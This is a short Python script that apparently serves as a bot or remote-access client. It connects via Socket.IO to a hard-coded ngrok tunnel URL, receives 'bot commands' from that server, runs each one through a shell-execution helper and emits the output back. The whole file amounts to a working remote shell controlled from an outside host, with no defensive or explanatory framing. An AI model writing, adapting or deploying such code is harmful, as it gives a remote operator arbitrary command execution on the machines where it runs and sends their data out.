import socketio
from cmd_executer import execute_shell_command
from random import randrange
from utils import *

sio = socketio.Client()

initialized = False


@sio.event
def set_initialized(data):
    print('Initilized with id ' + data)
    global initialized
    initialized = True

@sio.event
def handle_bot_command(data):
    print(data)
    try:
        response = execute_shell_command(data)
    except:
        response = "Unknown command"
    else:
        if(len(response) > 2500 or len(response) == 0):
            response = ">> Wrong response"
    sio.emit('command_response', str(initialization_code) + ' ' + response)

def main():
    sio.connect('https://3fff-89-178-159-143.ngrok.io')
    global initialization_code
    initialization_code = randrange(10)
    print('Initialization code:', initialization_code)
    sio.emit('initialize_new_client', str(initialization_code))
    wait_until(lambda: initialized == True)
    print("Listening...")
    sio.emit('command_response', str(initialization_code) + ' ')
    while True:
        pass

main()



